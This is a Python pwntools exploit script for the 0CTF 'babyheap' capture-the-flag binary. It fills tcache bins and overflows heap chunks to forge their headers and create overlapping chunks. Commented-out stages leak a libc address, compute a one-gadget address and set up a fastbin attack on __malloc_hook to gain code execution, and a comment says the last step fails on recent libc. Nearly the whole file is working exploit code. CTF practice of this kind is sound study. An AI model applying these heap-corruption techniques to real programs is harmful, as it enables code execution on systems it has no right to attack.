import pwn as p

# target = p.process('./0ctfbabyheap', env={'LD_PRELOAD': './libc-2.23.so'})
target = p.process('./0ctfbabyheap')
p.gdb.attach(target)
elf = p.ELF('./libc-2.31.so')

# methods to stop making pwn whine about bytes


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b))


def allocate(size: int):
    prints(target.recvuntil(b'Command:'))
    target.sendline(b'1')
    target.sendline(b(str(size)))


def fill(index: int, payload: bytes):
    prints(target.recvuntil(b'Command:'))
    target.sendline(b'2')
    target.sendline(b(str(index)))
    target.sendline(b(str(len(payload))))
    target.send(payload)


def free(index: int):
    prints(target.recvuntil(b'Command:'))
    target.sendline(b'3')
    target.sendline(b(str(index)))


def dump(index: int):
    prints(target.recvuntil(b'Command:'))
    target.sendline(b'4')
    target.sendline(b(str(index)))
    prints(target.recvuntil(b'Content: \n'))
    line = target.recvline()
    return line


def exit():
    prints(target.recvuntil(b'Command:'))
    target.sendline(b'5')


def fill_tcache(size):
    for i in range(7):
        allocate(size)
    for i in range(7):
        free(i)


# fill tcache
fill_tcache(0x10)
fill_tcache(0x30)
fill_tcache(0x60)
fill_tcache(0x70)
fill_tcache(0xf0)

allocate(0x30)  # differs from tutorial, in order to overwrite header of memory chunk below
allocate(0xf0)
allocate(0x70)
allocate(0xf0)
allocate(0x30)

fill(0, b'\x42'*0x30)  # id 0
fill(1, b'0'*0xf0)  # id 1
fill(2, b'1'*0x70)  # id 2
fill(3, b'2'*0xf0)  # id 3
fill(4, b'3'*0x30)  # id 4

free(1)
free(2)

allocate(0x78)  # id 1
fill(1, b'4'*0x70+p.p64(0x180)+p.p64(0x100))  # overwrite header of id 3
fill(0, b'\x42'*0x30+p.p64(0x0)+p.p64(0x181))  # overwrite header of id 1 so we pass a check when we free id 2 later

free(3)

# allocate(0xf0)

# fill(2, b'5'*0x50)

# # the leak will correspond to <main_arena+96>
# main_arena_leak = dump(1)
# main_arena_leak = p.u64(main_arena_leak[:8])
# print('leak:', hex(main_arena_leak))
# libc_base = main_arena_leak - elf.symbols['__malloc_hook'] - 0x70
# print('libc_base:', hex(libc_base))
# gadget = libc_base + 0xe6c7e
# print('gadget:', hex(gadget))
# malloc_hook = libc_base + elf.symbols['__malloc_hook']
# fake_chunk = malloc_hook - 0x10  # take headers in account
# print('fake_chunk:', hex(fake_chunk))


# # At this point we have
# # 0x30: id 0. contains \x42, used to overwrite next chunk's headers
# # 0xf0: id 2. (will soon be removed for rearrangement)
# # 0x78: id 1. contains 4, is considered as freed
# # 0xf0:
# # 0x30: id 4

# # As per the tutorial, we will reorganize the memory
# # 0x30: id 0
# # 0x10: id 2
# # 0x60: id 3
# # 0x60: id 5
# # 0x78: id 1 & 6
# # 0xf0:
# # 0x30: id 4

# free(2)  # free to make place for heap rearrangement

# allocate(0x10)  # id 2
# allocate(0x60)  # id 3
# allocate(0x60)  # id 5
# allocate(0x60)  # id 6

# # we should have same output for id 1 & 6
# fill(6, b'Hello there')
# print('Index 1:', dump(1))
# print('Index 6:', dump(6))

# free(6)
# free(5)
# free(1)

# allocate(0x60)  # id 1
# allocate(0x60)  # id 5
# fill(1, p.p64(fake_chunk) + p.p64(0) + b'y'*0x50)
# allocate(0x60)  # id 6

# # should have worked at this point but for the index check on recent libc
# # allocate(0x60)  # id 7, used to overwrite malloc_hook
# # fill(7, b'z'*0x13 + p.p64(gadget))

# # target.sendline(b'1')
# # target.sendline(b'2')

target.interactive()
